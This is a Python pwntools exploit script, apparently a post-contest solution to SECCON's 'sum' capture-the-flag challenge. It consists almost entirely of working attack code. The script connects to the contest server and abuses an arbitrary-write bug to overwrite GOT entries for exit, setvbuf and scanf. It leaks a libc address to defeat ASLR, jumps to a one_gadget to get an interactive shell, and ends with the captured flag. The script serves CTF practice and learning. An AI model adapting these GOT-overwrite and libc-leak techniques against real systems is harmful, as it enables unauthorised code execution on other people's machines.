from pwn import *
import time


binpath = "./sum"
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = """
gef
b main
"""
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote("sum.chal.seccon.jp", 10001)


def overwrite(addr, value):
    payload = '-{} -2 1 1 {} {}'.format(addr, value, addr)
    io.sendlineafter("2 3 4 0", payload)
    time.sleep(0.1)


overwrite(elf.got["exit"], elf.symbols["_start"])
overwrite(elf.got["setvbuf"], elf.plt["puts"])
overwrite(elf.symbols["__bss_start"], elf.got["alarm"])

io.recvline()
data = io.recvline().rstrip()
print(hexdump(data))
addr_libc = u64(data.ljust(8, b'\x00')) - 0xe4840

print("addr_libc = 0x{:x}".format(addr_libc))

one_gadets = list(map(lambda o: addr_libc + o, [324293, 324386, 1090444]))
overwrite(elf.got["__isoc99_scanf"], one_gadets[1])

io.interactive()


# solved after the contest
# SECCON{ret_call_call_ret??_ret_ret_ret........shell!}
